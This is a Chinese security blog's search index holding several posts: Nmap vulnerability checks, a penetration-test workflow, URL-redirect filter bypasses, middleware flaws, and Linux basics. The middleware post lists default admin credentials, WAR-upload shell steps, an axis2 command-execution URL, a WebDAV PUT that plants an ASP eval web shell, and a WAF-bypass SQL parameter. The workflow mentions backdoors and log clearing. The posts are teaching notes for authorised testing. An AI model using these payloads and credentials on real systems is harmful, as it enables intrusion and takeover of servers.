<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用Nmap验证漏洞]]></title>
    <url>%2F2018%2F02%2F20%2F%E4%BD%BF%E7%94%A8nmap%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[写这篇文章的原因有二：一是在渗透测试过程中，我们常常会用到综合扫描工具扫描目标网站，但是这种情况常常出现误报，这个时候就需要我们验证这些漏洞是否真的存在，这时候Nmap就可以使用Nmap来验证这些漏洞。二是我们使用Nmap常常只是使用它扫描端口、服务等信息这大大忽略了Nmap的强大功能。下面是我整理的一些使用Nmap扫描验证漏洞的命令，也是为了做个笔记防止忘记。 Nmap的介绍在这里我还是啰嗦一下，介绍一下Nmap（来自百度百科）。nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。 使用Nmap检测漏洞http拒绝服务1nmap --max-parallelism 800--script http-slowloris &lt;target&gt; IIS 短文件泄露1nmap -p 8080 --script http-iis-short-name-brute &lt;target&gt; 验证http中开启的-methods 方法1nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=/www.baidu.com 验证HTTP.sys 远程代码执行1nmap -sV --script http-vuln-cve2015-1635 &lt;target&gt; 验证mysql 匿名访问1nmap --script mysql-empty-password &lt;target&gt; 验证CVE-2014-0160 OpenSSL Heartbleed bug1nmap -p 443 --script ssl-heartbleed,ssl-known-key &lt;target&gt; 验证低安全的 SSHv1，sslv2协议1nmap --script sshv1,sslv2 &lt;target&gt; 验证 SSL POODLE information leak1nmap -sV -p 443 --version-light --script ssl-poodle &lt;target&gt; 验证弱加密SSL套件nmap –script ssl-enum-ciphers 精准地确认端口上运行的服务1nmap -sV --script unusual-port &lt;target&gt; 参考文件http://www.nmap.com.cn/doc/manual.shtmhttps://thief.one/2017/05/02/1/http://blog.csdn.net/qq_29277155/article/details/50977143#t3]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[测试流程]]></title>
    <url>%2F2018%2F01%2F15%2F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[在工作一段时间以后，对与渗透测试有了相对性的了解，下面就说一下实施一个从客户开始到渗透测试结束（简称安全测试流程），和对一个目标的渗透测试（简称渗透测试流程）的简单步骤。 安全测试流程安全测试流程包括测试前期准备，测试阶段实施，复测阶段实施，成果汇报阶段四大步骤，详情如下图： 在测试前期阶段要注意全面了解需要测试的目标，范围，测试方式时间，只有了解清楚这些才可以避免以后做测试造成麻烦。 测试阶段实施需要注意测试的深度（测试需要做到什么地步），报告的书写等 复测阶段实施需要注意查看是否漏洞全部修复，是否发现新漏洞。 成果汇报阶段需要注意点明测试范围，成果等。 渗透测试流程渗透测试与入侵的区别 渗透测试：出于保护系统的目的，更全面地找出务器的安全隐患。 入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。 测试流程这些流程只是一般的测试流程，对于渗透测试，每个人都有自己独自的思路。 明确目标 确定范围：测试目标的范围，ip，域名，内外网。 确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等。 确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等 信息收集方式：主动扫描，开放搜索等主动扫描：利用扫描工具（nmap，whatweb，站长工具等）开放搜索：利用搜索引擎获得，后台，未授权页面，敏感url等。 基础信息：IP，网段，域名，端口 系统信息：操作系统版本 应用信息：各端口的应用，例如web应用，邮件应用等等 版本信息：所有这些探测到的东西的版本。 服务信息 人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等。 防护信息：试着看能否探测到防护设备 漏洞探索利用上一步中列出的各种系统，应用等使用相应的漏洞。方法： 漏扫，awvs，IBM appscan等。 结合漏洞去exploit-db等位置找利用。 在网上寻找验证poc。内容： 系统漏洞：系统没有及时打补丁 Websever漏洞：Websever配置问题 Web应用漏洞：Web应用开发问题 其它端口服务漏洞：各种21/8080(st2)/7001/22/3389 通信安全：明文传输，token在cookie中传送等。 漏洞验证将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。 自动化验证：结合自动化扫描工具提供的结果 手工验证，根据公开资源进行验证 试验验证：自己搭建模拟环境进行验证 登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用 信息分析为下一步实施渗透做准备。 精准打击：准备好上一步探测到的漏洞的exp，用来精准打击 绕过防御机制：是否有防火墙等设备，如何绕过（一般在授权测试的时候是没有防火墙的） 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀） 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 获取所需 实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告 补充介绍：要对漏洞成因，验证过程和带来危害进行分析 修补建议：当然要对所有产生的问题提出合理高效安全的解决办法 流程总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[URL跳转漏洞]]></title>
    <url>%2F2018%2F01%2F11%2FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞描述服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss漏洞 漏洞检测修改参数中的合法URL为非法URL，然后查看是否能正常跳转或者响应包是否包含了任意的构造URL 绕过URL跳转限制利用问好绕过限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 。那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com 利用反斜杠和正斜杠绕过限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名钱加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址如：http://www.aaa.com/acb?Url=http://test.com/login.aaa.com反斜杠有三种思路 (1)两个反斜杠绕过方法 比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名钱加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址 如：http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com (2)一个反斜杠绕过方法 如：http://www.aaa.com/acb?Url=http://test.com\login.aaa.com (3)另一种思路，一个反斜杠一个点 利用.这样的格式，也就是一个反斜杠加一个点来跳过限制， 如：http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com 利用@绕过URL限制如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。如：http://www.aaa.com/acb?Url=http://login.aaa.com@test.com后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的 利用#号绕过如：http://www.aaa.com/acb?Url=http://test.com#login.aaa.com 利用白名单缺陷绕过限制有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧，为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：http://www.aaa.com/acb?Url=http://login.aaa.com，这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，包含，然后直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。 多重验证&amp;跳转绕过限制现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。多重跳转的问题导致可绕过URL限制比如http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com。当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。 点击触发达到绕过URL跳转限制比如很多登陆页面的地方，其URL是一个跳转的URL，如：http://www.aaa.com/acb?Url=http://test.com。你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转，当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。 利用超链接绕过可信站点限制比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的，只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了。难道就这样错失一个URL跳转漏洞了？其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx 因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL，当然，百度这个302有点长，你给它进行加密就行。 POST参数中的URL跳转当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交，当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步，这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX，当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息，为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。 当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行，在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！ 利用xip.io绕过请求是http://www.127.0.0.1.xip.io 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，http://www.qq.com.220.181.57.217.xip.io 当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。 漏洞修复的方法1.若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；2.若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；3.若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是你们公司授权的白名单或者是符合你们公司规则的url： function checkURL ( sURL) { return (/^(https?:\/\/)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\/|\)/i).test(sUrl)||(/^[\w][\w\/.-_%]+$/i).test(sUrl)||(/^[\/\][^\/\]/i).test(sUrl) ? true : false; }4.XSS漏洞的注意事项 ：跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 %00 -&gt; %1f 的控制字符时都是不合法的，需对其进行删除)。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>URL跳转</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中间件漏洞与防护]]></title>
    <url>%2F2017%2F12%2F15%2F%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E6%8A%A4%2F</url>
    <content type="text"><![CDATA[中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？ 中间件、容器、服务器傻傻分不清？在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html 基础概念与作用这里只介绍web中间件、web服务器、web容器，因为除了web以外，其概念还可以扩展为数据库等。 web服务器web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。 web中间件web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。 web容器web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。 所属的类别web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。web容器：JSP容器、SERVLET容器、ASP容器等。 注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。 重点分析web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器），当然它也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。 Tomcat漏洞与防护tomcat是apache的一个中间件软件，其可以提供jsp或者php的解析服务，为了方便远程管理与部署，安装完tomcat以后默认会有一个管理页面，管理员只需要远程上传一个WAR格式的文件，便可以将内容发布到网站，这一功能方便了管理员的同时也给黑客打开了方便之门，除此之外，tomcat还有一些样本页面，如果处理不当也会导致安全问题。 tomcat远程部署漏洞详情tomcat管理地址通常是：1http://127.0.0.1:8080/manager 默认账号密码：1234root/roottomcat/tomcat admin adminadmin 123456 tomcat口令爆破在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限） getshell过程首先将我们的.jsp shell文件打包为war文件：1jar -cvf shell.war shell.jsp 登录管理页面后，选择上传war文件。截图中间的目录便是上传成功以后的木马文件，可以点击浏览。直接在当前目录下访问shell.jsp。 Session Example样本页面默认地址：1http://localhost/servlets-examples/servlet/SessionExample 用来设置任意会话变量，恶意使用可对应用程序造成破坏。 tomcat漏洞防护1.升级tomcat版本2.删除远程部署页面，或者限定页面的访问权限。3.找到/conf/tomcat-users.xml修改用户名密码以及权限。4.删除样例页面文件 JBoss漏洞与防护JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。漏洞利用过程与tomcat类似，因此不再截图说明。除了远程部署漏洞外，jboss还存在反序列化漏洞，这里不再详述。 JBoss远程部署漏洞详情默认管理后台地址：1http://localhost:8080 getshell过程 访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。 JBoss漏洞防护1.开启jmx-console密码认证2.删除jmx-console.war与web-console.war WebLogic漏洞与防护weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口。漏洞利用过程与tomcat类似，因此不再截图说明。 Weblogic远程部署漏洞详情默认后台地址：1http://localhost:7001/console/login/loginForm.jsp 账号密码：1234用户名密码均为：weblogic用户名密码均为：system用户名密码均为：portaladmin用户名密码均为：guest getshell过程成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址。 Weblogic漏洞防护删除远程部署页面 axis2漏洞与防护axis2也是apache的一个项目，是新一代的SOAP引擎，其存在一个任意命令执行漏洞。（该漏洞来自补天平台） axis2命令执行漏洞详情默认后台地址：1http://localhost/axis2-admin/ 默认账号密码：admin与axis2登录后效果如下：执行系统命令poc1http://localhost/services/Axis2Shell/execCmd?cmd=whoami IIS漏洞与防护IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：IIS6.0远程命令执行漏洞(CVE-2017-7269) IIS Webdav漏洞详情当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。12OPTIONS / HTTP/1.1Host:baidu.com 如果存在PUT方法，则可以尝试写入一个txt文件。1234PUT /shell.txt HTTP/1.1HOST:baidu.comContent-length:30&lt;%eval request(&quot;test&quot;)%&gt; 若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。通过MOVE或COPY方法改文件后缀名。123COPY /shell.txt HTTP/1.1HOST:xxx.comDestination:http://www.xxx.com/shell.asp IIS漏洞防护关闭webdav功能 HPP漏洞HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。1234&lt;?php $str=$_REQUEST[&apos;str&apos;]; #$_REQUEST[]函数可以接受GET/POST。 Echo $str;?&gt; 比如访问URL:1http://www.xxx.com/index.php?str=hello 此时页面显示hello但如果访问:1http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=test 此时页面显示test，把前面参数的值给覆盖了，这就是http参数污染。 利用场景绕过WAF，如：1PHP:index.php?str=1&amp;str=select * from admin -- 因为WAF可能会校验值的第一个单词，如果为select则触发，这样子可以避免被触发。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab计划任务]]></title>
    <url>%2F2017%2F12%2F07%2Fcrontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20%2F</url>
    <content type="text"><![CDATA[rontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。 计划任务基本格式1* * * * * command 分 时 日 月 周 命令第1列表示分钟1～59 每分钟用或者/1表示第2列表示小时1～23（0表示0点）第3列表示日期1～31第4列表示月份1～12第5列标识号星期0～6（0表示星期天）第6列要运行的命令 crontab usagecrontab -h 查看命令帮助crontab -e 编辑计划任务sudo crontab -l 列出root的计划任务crontab -u nmask -l 列出nmask的计划任务crontab -r 删除计划任务一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。 每秒执行1* * * * * sleep 10; 每10s运行一次。crontab文件的一些例子12345678930 21 * * * /usr/local/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:4510 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 0 */1 * * * /usr/local/etc/rc.d/lighttpd restart 每一小时重启apache 0 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache 0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache0 4 1 jan * /usr/local/etc/rc.d/lighttpd restart 一月一号的4点重启apache 坑点12*/1 * * * * 每分钟执行1 * * * * 每小时执行一次 注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi/vim键盘图]]></title>
    <url>%2F2017%2F12%2F07%2Fvim%E9%94%AE%E7%9B%98%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[在linux上有个强大的编译器，这个编译器就是vim，下面是一个vim的键盘图，有利于学习和复习。 复制剪切粘贴123yy # 复制一行dd # 剪切一行p # 粘贴 查找单词123bin/bash&gt;:/nmask # 查找存在nmask字符串的位置或者bin/bash&gt;:?nmask # 查找存在nmask字符串的位置 继续查找下一个存在nmask字符串的位置 n 往上查找 N 往下查找 编辑器显示设置123:set nu! # 显示行号:set autoindent # 自动缩进:syntax enable # 语法高亮 文件内容定位12345gg # 首行G # 末行XG # 定位到第X行或者：bin/bash&gt;：10 # 定位到第10行]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux基础命令]]></title>
    <url>%2F2017%2F12%2F06%2FLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[在安全方面，掌握Linux系统对安全研究是非常重要的。首先我们就需要对一些常用的命令和参数熟连掌握，然后一步一步的进行深入的学习。这篇文章，主要分享一些我常用的Linux命令，也是做一个笔记，为以后复习做准备。 帮助命令解析命令的意思（whatis、info）12whatis 解析命令的意思info 详细解析命令的意思 寻找命令的安装路径（which、whereis）12which 寻找命令的位置whereis 寻找程序的位置 目录管理文件管理不外乎文件或目录的创建、删除、查询、移动，有mkdir/rm/mv 创建和删除创建：mkdir删除：rm删除非空目录：rm -rf file目录移动：mv复制：cp (复制目录：cp -r ) 查看当前目录下文件个数:1$find ./ | wc -l 复制目录:1$cp -r source_dir dest_dir 列出目录项（ls、tree）显示当前目录下的文件1ls 查看目录结构1tree 按时间排序，以列表的方式显示目录项1ls -lrt 以上这个命令用到的频率如此之高，以至于我们需要为它建立一个快捷命令方式:在.bashrc 中设置命令别名:12alias lsl=&apos;ls -lrt&apos;alias lm=&apos;ls -al|more&apos; 给每项文件前面增加一个id编号1ls | cat -n 显示可阅读的文件大小1ll -h 文件和目录权限（chmod、chown）1234改变文件的拥有者 chown改变文件读、写、执行等属性 chmod递归子目录修改： chown -R tuxapp source/增加脚本可执行权限： chmod a+x myscript 文件管理文件创建删除(touch、echo、rm -f)删除日志文件1rm *log (等价: $find ./ -name “*log” -exec rm &#123;&#125; ;) 文件查看(du -sh)1du -sh 文件名 统计文件行数1wc -l test.txt 文件内容查看（cat,head,tail）显示时同时显示行号1cat -n （如：cat test.txt | cat -n） 动态查看文件内容1tail -f filename #当有内容写入文件中再输出 正向逆向查看文件内容12head -1 filename # 第1行内容tail -5 filename # 倒数5行内容 文件搜索（find）查找txt和pdf文件1find . \( -name &quot;*.txt&quot; -o -name &quot;*.pdf&quot; \) -print 否定参数 ,查找所有非txt文本1find . ! -name &quot;*.txt&quot; -print 指定搜索深度,打印出当前目录的文件（深度为1）1find . -maxdepth 1 -type f 说明：-type f为文件，d为目录 按时间搜索-atime 访问时间 (单位是天，分钟单位则是-amin，以下类似）-mtime 修改时间 （内容被修改）-ctime 变化时间 （元数据或权限变化）最近第7天被访问过的所有文件1find . -atime 7 -type f -print 最近7天内被访问过的所有文件1find . -atime -7 -type f -print 查询7天前被访问过的所有文件1find . -atime +7 type f -print 按权限查找1find . -type f -perm 644 -print //找具有可执行权限的所有文件 按用户查找1find . -type f -user weber -print// 找用户weber所拥有的文件 找到后的后续动作（exec）执行动作（强大的exec）将当前目录下的所有权变更为weber:1find . -type f -user root -exec chown weber &#123;&#125; \; 注：{}是一个特殊的字符串，对于每一个匹配的文件，{}会被替换成相应的文件名；将找到的文件全都copy到另一个目录:1find . -type f -mtime +10 -name &quot;*.txt&quot; -exec cp &#123;&#125; OLD \; 文件内容搜索(grep)查看成功登陆ssh的IP地址：1234centosfor i in `grep &apos;sshd&apos; /var/log/secure* | grep -oE &apos;\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;&apos; | sort | uniq`; do curl -s --header &quot;X-Forwarded-For: $i&quot; http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P &apos;(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)&apos; ; doneubuntu：for i in `grep &apos;sshd&apos; /var/log/auth.log* |grep &apos;Accepted&apos; |grep ftp| grep -oE &apos;\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;&apos; | sort | uniq`; do curl -s --header &quot;X-Forwarded-For: $i&quot; http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P &apos;(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)&apos; ; done 文件内容排序(sort)-n 按数字进行排序 VS -d 按字典序进行排序-r 逆序排序-k N 指定按第N列排序12sort -nrk 1 data.txtsort -bd data // 忽略像空格之类的前导空白字符 用户管理添加用户1useradd -m username 该命令为用户创建相应的帐号和用户目录/home/username设置密码1passwd username 删除用户1userdel -r username 注意：不带选项使用 userdel，只会删除用户。用户的家目录将仍会在/home目录下。要完全的删除用户信息，使用-r选项 帐号切换 登录帐号为userA用户状态下，切换到userB用户帐号工作1su userB 用户的组将用户加入到组默认情况下，添加用户操作也会相应的增加一个同名的组，用户属于同名组； 查看当前用户所属的组:1groups 一个用户可以属于多个组，将用户加入到组:1usermod -G groupNmame username 变更用户所属的根组(将用加入到新的组，并从原有的组中除去）:1usermod -g groupName username 查看系统所有组系统的所有用户及所有组信息分别记录在两个文件中：/etc/passwd , /etc/group 默认情况下这两个文件对所有用户可读： 查看所有用户及权限:1more /etc/passwd 查看所有的用户组及权限:1more /etc/group 用户权限chown 更改读写权限chmod 更改用户的拥有者 进程管理杀死python相关的进程123ps -ef | grep python | cut -d &apos; &apos; -f 2 | xargs kill或者pkill -9 python #-9表示强制删除，pkill以进程名字匹配 查看进程1ps -ef | less 查看端口占用的进程状态：1lsof -i:3306 显示进程信息，并实时更新1top 杀死指定PID的进程 (PID为Process ID)1kill PID 查询7902端口现在运行什么程序:1234567891011#分为两步#第一步，查询使用该端口的进程的PID；$lsof -i:7902COMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEWSL 30294 tuapp 4u IPv4 447684086 TCP 10.6.50.37:tnos-dp (LISTEN)#查到30294#使用ps工具查询进程详情：$ps -fe | grep 30294tdev5 30294 26160 0 Sep10 ? 01:10:50 tdesl -k 43476root 22781 22698 0 00:54 pts/20 00:00:00 grep 11554 网络管理查看网络连接1netstat -an | less 查看网络路由1route -n 只查看ip信息1ifconfig | grep inet ftp sftp sshSSH登陆:1ssh ID@host ssh登陆远程服务器host，ID为用户名。ftp/sftp文件传输:1sftp ID@host 登陆服务器host，ID为用户名。sftp登陆后，可以使用下面的命令进一步操作： get filename # 下载文件 put filename # 上传文件 ls # 列出host上当前路径的所有文件 cd # 在host上更改当前路径 lls # 列出本地主机上当前路径的所有文件 lcd # 在本地主机更改当前路径 系统管理查看系统位数1getconf LONG_BIT 查看系统版本1lsb_release -a 查看hosts文件1cat /etc/hosts 查看CPU的核的个数1cat /proc/cpuinfo | grep processor | wc 